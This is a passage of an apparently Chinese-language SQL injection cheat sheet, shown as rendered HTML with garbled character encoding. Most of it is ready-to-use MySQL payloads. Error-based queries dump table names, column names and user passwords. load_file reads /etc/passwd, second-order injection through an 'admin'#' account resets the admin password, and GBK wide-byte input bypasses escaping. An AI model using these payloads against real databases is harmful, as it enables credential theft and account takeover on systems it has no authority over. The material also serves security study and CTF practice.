class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),<span class="hljs-string">&#x27;|&#x27;</span>,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>çˆ†å­—æ®µ<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-keyword">where</span><br>table_schema<span class="hljs-operator">=</span>database() <span class="hljs-keyword">and</span> table_name<span class="hljs-operator">=</span>â€˜usersâ€™ limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>),â€™<span class="hljs-operator">|</span>â€™,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables<br><span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br>çˆ†æ•°æ®<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),(concat((<span class="hljs-keyword">select</span> concat(name,â€™<span class="hljs-operator">|</span>â€™,passwd,â€™<span class="hljs-operator">|</span>â€™,birth) <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>),â€™<span class="hljs-operator">|</span>â€™,<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>)))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a;<br><span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(<span class="hljs-operator">*</span>),concat((<span class="hljs-keyword">select</span> (<span class="hljs-keyword">select</span> (<span class="hljs-keyword">SELECT</span> concat(<span class="hljs-number">0x23</span>,name,<span class="hljs-number">0x3a</span>,passwd,<span class="hljs-number">0x23</span>) <span class="hljs-keyword">FROM</span> users limit<br><span class="hljs-number">0</span>,<span class="hljs-number">1</span>)) <span class="hljs-keyword">from</span> information_schema.tables limit <span class="hljs-number">3</span>,<span class="hljs-number">1</span>),<span class="hljs-built_in">floor</span>(rand(<span class="hljs-number">0</span>)<span class="hljs-operator">*</span><span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.tables <span class="hljs-keyword">group</span> <span class="hljs-keyword">by</span> x)a<br></code></pre></td></tr></table></figure><p>å‡ ä½•å‡½æ•° </p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs sql">GeometryCollectionï¼šid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> GeometryCollection((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span><span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>polygon()ï¼šid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> polygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipoint()ï¼šid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipoint((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multilinestring()ï¼šid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multilinestring((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>linestring()ï¼šid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> LINESTRING((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br>multipolygon() ï¼šid<span class="hljs-operator">=</span><span class="hljs-number">1</span> <span class="hljs-keyword">AND</span> multipolygon((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)b))<br></code></pre></td></tr></table></figure><p>ä¸å­˜åœ¨å‡½æ•°</p><blockquote><p>çˆ†æ•°æ®åº“</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032231655.jpg" alt="image-20220708181105742"></p></blockquote><p>name_const()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">è·å–ç‰ˆæœ¬ä¿¡æ¯<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> name_const(version(),<span class="hljs-number">0x1</span>),name_const(version(),<span class="hljs-number">0x1</span>))a;<br># <span class="hljs-number">1060</span> <span class="hljs-operator">-</span> Duplicate <span class="hljs-keyword">column</span> name <span class="hljs-string">&#x27;8.0.27&#x27;</span><br></code></pre></td></tr></table></figure><p>uuidç›¸å…³å‡½æ•°</p><p>mysql:8.0.x</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span> <span class="hljs-keyword">SELECT</span> UUID_TO_BIN((<span class="hljs-keyword">SELECT</span> password <span class="hljs-keyword">FROM</span> users <span class="hljs-keyword">WHERE</span> id<span class="hljs-operator">=</span><span class="hljs-number">1</span>));<br># <span class="hljs-number">1146</span> <span class="hljs-operator">-</span> <span class="hljs-keyword">Table</span> <span class="hljs-string">&#x27;test.users&#x27;</span> doesn<span class="hljs-string">&#x27;t exist</span><br><span class="hljs-string">mysql&gt; SELECT BIN_TO_UUID((SELECT password FROM users WHERE id=1));</span><br><span class="hljs-string"># 1146 - Table &#x27;</span>test.users<span class="hljs-string">&#x27; doesn&#x27;</span>t exist<br></code></pre></td></tr></table></figure><p>exp() é€‚ç”¨ç‰ˆæœ¬ 5.5.5-5.5.49</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-built_in">exp</span>(<span class="hljs-operator">~</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">FROM</span>(<span class="hljs-keyword">SELECT</span> <span class="hljs-keyword">USER</span>())a));<br><span class="hljs-comment">--å…¶ä¸­ï¼Œ~ç¬¦å·ä¸ºè¿ç®—ç¬¦ï¼Œæ„æ€ä¸ºä¸€å…ƒå­—ç¬¦åè½¬ï¼Œé€šå¸¸å°†å­—ç¬¦ä¸²ç»è¿‡å¤„ç†åå˜æˆå¤§æ•´æ•°ï¼Œå†æ”¾åˆ°expå‡½ æ•°å†…ï¼Œå¾—åˆ°çš„ç»“æœå°†è¶…è¿‡mysqlçš„doubleæ•°ç»„èŒƒå›´ï¼Œä»è€ŒæŠ¥é”™è¾“å‡ºã€‚é™¤äº†exp()ä¹‹å¤–ï¼Œè¿˜æœ‰ç±»ä¼¼pow()ä¹‹ç±»çš„ç›¸ä¼¼å‡½æ•°åŒæ ·æ˜¯å¯åˆ©ç”¨çš„ï¼Œä»–ä»¬çš„åŸç†ç›¸åŒã€‚</span><br><span class="hljs-comment">--double æ•°å€¼ç±»å‹è¶…å‡ºèŒƒå›´</span><br><span class="hljs-comment">--Exp()ä¸ºä»¥e ä¸ºåº•çš„å¯¹æ•°å‡½æ•°ï¼›</span><br><br><span class="hljs-comment">--ERROR 1690 (22003): DOUBLE value is out of range in &#x27;exp(~((select &#x27;root@localhost&#x27; from dual)))&#x27;</span><br><br>å¦‚æœæ˜¯åœ¨é€‚ç”¨ç‰ˆæœ¬ä¹‹å¤–ï¼šè™½ç„¶ä¹Ÿä¼šæŠ¥é”™ï¼Œä½†æ˜¯è¡¨åä¸ä¼šå‡ºæ¥<br><span class="hljs-keyword">select</span> <span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a)<span class="hljs-operator">-</span><span class="hljs-operator">~</span><span class="hljs-number">0</span>;<br></code></pre></td></tr></table></figure><blockquote><p>expæŠ¥é”™<a href="https://www.cnblogs.com/lcamry/articles/5509124.html">ï¼ˆè½¬è½½ï¼‰ä½¿ç”¨expè¿›è¡ŒSQLæŠ¥é”™æ³¨å…¥ - lcamry - åšå®¢å›­ (cnblogs.com)</a></p></blockquote><p>pow()ç»“åˆç›²æ³¨</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> pow(<span class="hljs-number">1</span><span class="hljs-operator">+</span>(è¡¨è¾¾å¼),<span class="hljs-number">999999999999</span>)<br># è¡¨è¾¾å¼å¯ä»¥æ˜¯ç›²æ³¨çš„å½¢å¼ï¼Œè¿”å›<span class="hljs-number">1</span>æˆ–è€…<span class="hljs-number">0</span>ï¼Œé€šè¿‡æŠ¥é”™å°†å­—ç¬¦çŒœå‡ºæ¥ï¼ŒæŠ¥é”™å›æ˜¾çš„è¡¨è¾¾å¼æ˜¯è¿”å›<span class="hljs-number">1</span>çš„<br># åŒæ ·æ–¹å¼ç”¨åœ¨expä¸Š(ä¸´ç•Œå€¼ä¸º<span class="hljs-number">709</span>)<br><span class="hljs-built_in">exp</span>(<span class="hljs-number">709</span><span class="hljs-operator">+</span>(è¡¨è¾¾å¼))<br></code></pre></td></tr></table></figure><p>bigint æº¢å‡ºæ–‡ç« <a href="http://www.cnblogs.com/lcamry/articles/5509112.html">http://www.cnblogs.com/lcamry/articles/5509112.html</a></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-string">&#x27;?id=1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> (<span class="hljs-operator">!</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())x) <span class="hljs-operator">-</span> <span class="hljs-operator">~</span><span class="hljs-number">0</span>),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><h3 id="xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨"><a href="#xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨" class="headerlink" title="xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨"></a>xpathè¯­æ³•é”™è¯¯â€“è¾ƒå¸¸ç”¨</h3><p>æŠ¥é”™åŸå› ï¼Œ0x7eå°±æ˜¯~ä¸å±äºxpathè¯­æ³•æ ¼å¼</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>));<br><span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> @<span class="hljs-variable">@version</span>),<span class="hljs-number">0x7e</span>),<span class="hljs-number">1</span>);<br># é€‚ç”¨ç‰ˆæœ¬: <span class="hljs-number">5.1</span><span class="hljs-number">.5</span><span class="hljs-operator">+</span><br></code></pre></td></tr></table></figure><blockquote><p>updatexmlä¸‰ä¸ªå‚æ•°</p><ul><li><p>ç¬¬ä¸€ä¸ªå‚æ•°ï¼šXML_document æ˜¯ String æ ¼å¼ï¼Œä¸º XML æ–‡æ¡£å¯¹è±¡çš„åç§°ï¼Œæ–‡ä¸­ä¸º Doc 1</p></li><li><p>ç¬¬äºŒä¸ªå‚æ•°ï¼šXPath_string (Xpath æ ¼å¼çš„å­—ç¬¦ä¸²) ï¼Œå¦‚æœä¸äº†è§£ Xpath è¯­æ³•ï¼Œå¯ä»¥åœ¨ç½‘ä¸ŠæŸ¥æ‰¾æ•™ç¨‹ã€‚</p></li><li><p>ç¬¬ä¸‰ä¸ªå‚æ•°ï¼šnew_valueï¼ŒString æ ¼å¼ï¼Œæ›¿æ¢æŸ¥æ‰¾åˆ°çš„ç¬¦åˆæ¡ä»¶çš„æ•°æ®**</p></li></ul><p>æ³¨æ„åŠ selecté˜²æ­¢ä¸å›æ˜¾ï¼Œå½“æ˜¾ç¤ºå­—ç¬¦æœ‰é™æ—¶ï¼Œå¸¸ç”¨å­—ç¬¦ä¸²æˆªæ–­substré…åˆ</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> NAME_CONST(version(),<span class="hljs-number">1</span>),NAME_CONST(version(),<span class="hljs-number">1</span>))x;<br><span class="hljs-comment">--mysql é‡å¤ç‰¹æ€§ï¼Œæ­¤å¤„é‡å¤äº†versionï¼Œæ‰€ä»¥æŠ¥é”™ã€‚</span><br></code></pre></td></tr></table></figure></blockquote><h3 id="Join-using-æ³¨åˆ—å"><a href="#Join-using-æ³¨åˆ—å" class="headerlink" title="Join using()æ³¨åˆ—å"></a>Join using()æ³¨åˆ—å</h3><p>mysql8ä¿®å¤</p><p>æŠ¥é”™å­˜åœ¨é‡å¤çš„åˆ—å</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b)c; # æŠ¥é”™ä¿¡æ¯å†…å›æ˜¾ç¬¬ä¸€åˆ—åç§°<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username))c;# ç¬¬äºŒåˆ—<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users a <span class="hljs-keyword">join</span> (<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users)b <span class="hljs-keyword">using</span>(username,password))c;# ç¬¬ä¸‰åˆ—<br></code></pre></td></tr></table></figure><h3 id="GTIDç›¸å…³å‡½æ•°"><a href="#GTIDç›¸å…³å‡½æ•°" class="headerlink" title="GTIDç›¸å…³å‡½æ•°"></a>GTIDç›¸å…³å‡½æ•°</h3><p>ç‰ˆæœ¬&gt;&#x3D;5.6.5</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(<span class="hljs-keyword">user</span>(),<span class="hljs-number">1</span>); # æŠ¥é”™å›æ˜¾ç”¨æˆ·<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subset(hex(substr((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users limit<br><span class="hljs-number">1</span>,<span class="hljs-number">1</span>),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>)),<span class="hljs-number">1</span>);<br>mysql<span class="hljs-operator">&gt;</span><span class="hljs-keyword">select</span> gtid_subtract((<span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span>(<span class="hljs-keyword">select</span> <span class="hljs-keyword">user</span>())a),<span class="hljs-number">1</span>); # æŠ¥é”™å›æ˜¾ç”¨æˆ·<br></code></pre></td></tr></table></figure><h2 id="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶"><a href="#å¯¼å…¥å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="å¯¼å…¥å¯¼å‡ºæ–‡ä»¶"></a>å¯¼å…¥å¯¼å‡ºæ–‡ä»¶</h2><h3 id="æŸ¥çœ‹é™åˆ¶"><a href="#æŸ¥çœ‹é™åˆ¶" class="headerlink" title="æŸ¥çœ‹é™åˆ¶"></a>æŸ¥çœ‹é™åˆ¶</h3><p>secure_file_priv</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232760.jpg" alt="image-20220708190755416"></p><h3 id="load-file-å¯¼å‡ºæ–‡ä»¶"><a href="#load-file-å¯¼å‡ºæ–‡ä»¶" class="headerlink" title="load_file()å¯¼å‡ºæ–‡ä»¶"></a>load_file()å¯¼å‡ºæ–‡ä»¶</h3><p>load_file(filename)</p><p><img src="https://cdn.jsdelivr.net/gh/sloth31/images@main//202407032232156.jpg" alt="image-20220708190902690"></p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql"><span class="hljs-keyword">select</span> load_file(<span class="hljs-string">&#x27;/flag&#x27;</span>);<br><span class="hljs-keyword">select</span> <span class="hljs-keyword">convert</span>(load_file(&quot;/etc/passwd&quot;) <span class="hljs-keyword">using</span> utf8);<br></code></pre></td></tr></table></figure><p>è¯¦è§<a href="https://ccship.cn/2021/10/21/sql%E6%B3%A8%E5%85%A5%E6%80%BB%E7%BB%93/">SQLæ³¨å…¥æ€»ç»“ â€“ cc (ccship.cn)</a></p><h2 id="äºŒæ¬¡æ³¨å…¥"><a href="#äºŒæ¬¡æ³¨å…¥" class="headerlink" title="äºŒæ¬¡æ³¨å…¥"></a>äºŒæ¬¡æ³¨å…¥</h2><h3 id="å¸¸è§æ€è·¯-1"><a href="#å¸¸è§æ€è·¯-1" class="headerlink" title="å¸¸è§æ€è·¯"></a>å¸¸è§æ€è·¯</h3><p>å¦‚æœæ˜¯å•å¼•å·é—­åˆ</p><p>æ³¨å†Œä¸€ä¸ª<code>admin&#39;#</code>è´¦æˆ·ï¼Œç™»å½•ä¿®æ”¹å…¶å¯†ç ï¼Œåˆ™å®é™…æ”¹çš„æ˜¯adminçš„å¯†ç </p><h2 id="å®½å­—èŠ‚æ³¨å…¥"><a href="#å®½å­—èŠ‚æ³¨å…¥" class="headerlink" title="å®½å­—èŠ‚æ³¨å…¥"></a>å®½å­—èŠ‚æ³¨å…¥</h2><p>å®½å­—èŠ‚å°±æ˜¯ä¸¤ä¸ªä»¥ä¸Šçš„å­—èŠ‚ï¼Œå®½å­—èŠ‚æ³¨å…¥äº§ç”Ÿçš„åŸå› å°±æ˜¯å„ç§å­—ç¬¦ç¼–ç çš„ä¸å½“æ“ä½œï¼Œä½¿å¾—æ”»å‡»è€…å¯ä»¥é€šè¿‡å®½å­—èŠ‚ç¼–ç ç»•è¿‡SQLæ³¨å…¥é˜²å¾¡ã€‚</p><p>å®½å­—èŠ‚æ³¨å…¥ä¸»è¦æ˜¯æºäºç¨‹åºå‘˜è®¾ç½®æ•°æ®åº“ç¼–ç ä¸PHPç¼–ç è®¾ç½®ä¸ºä¸åŒçš„ä¸¤ä¸ªç¼–ç é‚£ä¹ˆå°±æœ‰å¯èƒ½äº§ç”Ÿå®½å­—èŠ‚æ³¨å…¥ã€‚PHPçš„ç¼–ç ä¸ºUTF-8 è€ŒMySqlçš„ç¼–ç è®¾ç½®ä¸ºäº†SET NAMES â€˜gbkâ€™ æˆ–æ˜¯SET character_set_client &#x3D;gbkï¼Œè¿™æ ·é…ç½®ä¼šå¼•å‘ç¼–ç è½¬æ¢ä»è€Œå¯¼è‡´çš„æ³¨å…¥æ¼æ´ã€‚</p><h3 id="ç›¸å…³å‡½æ•°"><a href="#ç›¸å…³å‡½æ•°" class="headerlink" title="ç›¸å…³å‡½æ•°"></a>ç›¸å…³å‡½æ•°</h3><ul><li><p><strong>addslashes()</strong> ï¼šè¿™ä¸ªå‡½æ•°åœ¨é¢„å®šä¹‰å­—ç¬¦ä¹‹å‰æ·»åŠ åæ–œæ  \ ã€‚é¢„å®šä¹‰å­—ç¬¦ï¼š å•å¼•å· â€˜ ã€åŒå¼•å· â€ ã€åæ–œæ  \ ã€NULLã€‚ä½†æ˜¯è¿™ä¸ªå‡½æ•°æœ‰ä¸€ä¸ªç‰¹ç‚¹å°±æ˜¯è™½ç„¶ä¼šæ·»åŠ åæ–œæ  \ è¿›è¡Œè½¬ä¹‰ï¼Œä½†æ˜¯ \ å¹¶ä¸ä¼šæ’å…¥åˆ°æ•°æ®åº“ä¸­ã€‚</p><blockquote><p>è¿™ä¸ªå‡½æ•°åŠŸèƒ½ä¸é­”æœ¯å¼•å·åŠŸèƒ½å®Œå…¨ç›¸åŒï¼Œå¦‚æœé­”æœ¯å¼•å·æ‰“å¼€å°±ä¸è¦ç”¨è¿™ä¸ªå‡½æ•°äº†</p></blockquote></li><li><p>ä¸‰ä¸ªé­”æœ¯å¼•å·åŠŸèƒ½</p><blockquote><ol><li><p>magic_quotes_gpc å½±å“åˆ° HTTP è¯·æ±‚æ•°æ®ï¼ˆGETï¼ŒPOST å’Œ COOKIEï¼‰ã€‚ä¸èƒ½åœ¨è¿è¡Œæ—¶æ”¹å˜ã€‚åœ¨ PHP ä¸­é»˜è®¤å€¼ä¸º onã€‚ å‚è§ get_magic_quotes_gpc()ã€‚å¦‚æœ magic_quotes_gpc å…³é—­æ—¶è¿”å› 0ï¼Œå¼€å¯æ—¶è¿”å› 1ã€‚åœ¨ PHP 5.4.0 èµ·å°†å§‹ç»ˆè¿”å› 0ï¼Œå› ä¸ºè¿™ä¸ªé­”æœ¯å¼•å·åŠŸèƒ½å·²ç»ä» PHP ä¸­ç§»é™¤äº†ã€‚</p></li><li><p>magic_quotes_runtime å¦‚æœæ‰“å¼€çš„è¯ï¼Œå¤§éƒ¨ä»½ä»å¤–éƒ¨æ¥æºå–å¾—æ•°æ®å¹¶è¿”å›çš„å‡½æ•°ï¼ŒåŒ…æ‹¬ä»æ•°æ®åº“å’Œæ–‡æœ¬æ–‡ä»¶ï¼Œæ‰€è¿”å›çš„æ•°æ®éƒ½ä¼šè¢«åæ–œçº¿è½¬ä¹‰ã€‚è¯¥é€‰é¡¹å¯åœ¨è¿è¡Œçš„æ—¶æ”¹å˜ï¼Œåœ¨ PHP ä¸­çš„é»˜è®¤å€¼ä¸º offã€‚ å‚è§ set_magic_quotes_runtime() å’Œ get_magic_quotes_runtime()ã€‚</p></li><li><p>magic_quotes_sybase (é­”æœ¯å¼•å·å¼€å…³)å¦‚æœæ‰“å¼€çš„è¯ï¼Œå°†ä¼šä½¿ç”¨å•å¼•å·å¯¹å•å¼•å·è¿›è¡Œè½¬ä¹‰è€Œéåæ–œçº¿ã€‚æ­¤é€‰é¡¹ä¼šå®Œå…¨è¦†ç›– magic_quotes_gpcã€‚å¦‚æœåŒæ—¶æ‰“å¼€ä¸¤ä¸ªé€‰é¡¹çš„è¯ï¼Œå•å¼•å·å°†ä¼šè¢«è½¬ä¹‰æˆ â€ã€‚è€ŒåŒå¼•å·ã€åæ–œçº¿ å’Œ NULL å­—ç¬¦å°†ä¸ä¼šè¿›è¡Œè½¬ä¹‰ã€‚</p></li></ol></blockquote></li></ul><h3 id="gbkç¼–ç "><a href="#gbkç¼–ç " class="headerlink" title="gbkç¼–ç "></a>gbkç¼–ç </h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs sql">ç”¨æˆ·åè¾“å…¥ï¼šadmin<span class="hljs-operator">%</span>df<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">è½¬ä¹‰åä¸ºï¼š admin%df\&#x27;</span> <span class="hljs-keyword">or</span> <span class="hljs-number">1</span><span class="hljs-operator">=</span><span class="hljs-number">1</span>#<br><span class="hljs-keyword">SET</span> character_set_client <span class="hljs-operator">=</span><span class="hljs-string">&#x27;gbk&#x27;</span>åï¼šadminé‹<span class="hljs-string">&#x27; or 1=1#</span><br><span class="hljs-string">æ‰§è¡Œè¯­å¥ï¼š... where username=&#x27;</span>adminé‹<span class="hljs-string">&#x27; or 1=1#&#x27;</span><br></code></pre></td></tr></table></figure><blockquote><p><code>%df</code>åƒæ‰<code>\</code>çš„åŸå› æ˜¯ï¼Œ<code>urlencode(\&#39;)</code>&#x3D;<code>%5c%27</code> ,æ·»åŠ %dfåå½¢æˆ<code>%df%5c%27</code>,è€Œä¸Šé¢æåˆ°çš„mysql åœ¨GBK ç¼–ç æ–¹å¼çš„ï¼Œç¬¬ä¸€ä½èŒƒå›´ä¸º0x00-0x7Fæ—¶ï¼Œå½“ä½œä¸€ä¸ªå­—ç¬¦ã€‚%dfä¸åœ¨è¿™ä¸ªèŒƒå›´å†…ï¼Œå› æ­¤ä¼šå°†ä¸¤ä¸ªå­—èŠ‚å½“åšä¸€ä¸ªæ±‰å­—ï¼Œæ­¤æ—¶%df%5c å°±æ˜¯ä¸€ä¸ªæ±‰å­—ï¼Œ%27(â€˜) åˆ™ä½œä¸ºä¸€ä¸ªå•ç‹¬çš„ç¬¦å·åœ¨å¤–é¢ï¼ŒåŒæ—¶ä¹Ÿå°±è¾¾åˆ°äº†æˆ‘ä»¬çš„ç›®çš„</p></blockquote><h3 id="utf8ç¼–ç ã€Latin1ç¼–ç "><a href="#utf8ç¼–ç ã€Latin1ç¼–ç " class="headerlink" title="utf8ç¼–ç ã€Latin1ç¼–ç "></a>utf8ç¼–ç ã€Latin1ç¼–ç </h3><p>UTF-8ç¼–ç æ˜¯å˜é•¿ç¼–ç ï¼Œå¯èƒ½æœ‰1~4ä¸ªå­—èŠ‚è¡¨ç¤ºï¼š </p><ul><li>ä¸€å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[00-7F] </code></li><li>ä¸¤å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[C0-DF][80-BF]</code> </li><li>ä¸‰å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[E0-EF][80-BF][80-BF]</code> </li><li>å››å­—èŠ‚æ—¶èŒƒå›´æ˜¯<code>[F0-F7][80-BF][80-BF][80-BF]</code></li></ul><blockquote><p>ç„¶åæ ¹æ®RFC 3629è§„èŒƒï¼Œåˆæœ‰ä¸€äº›å­—èŠ‚å€¼æ˜¯ä¸å…è®¸å‡ºç°åœ¨UTF-8ç¼–ç ä¸­, æ‰€ä»¥æœ€ç»ˆï¼ŒUTF-8ç¬¬ä¸€å­—èŠ‚çš„å–å€¼èŒƒå›´æ˜¯ï¼š00-7Fã€C2-F4ã€‚</p></blockquote><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs sql">è¾“å…¥ï¼š?username<span class="hljs-operator">=</span>admin<span class="hljs-operator">%</span>c2<br><span 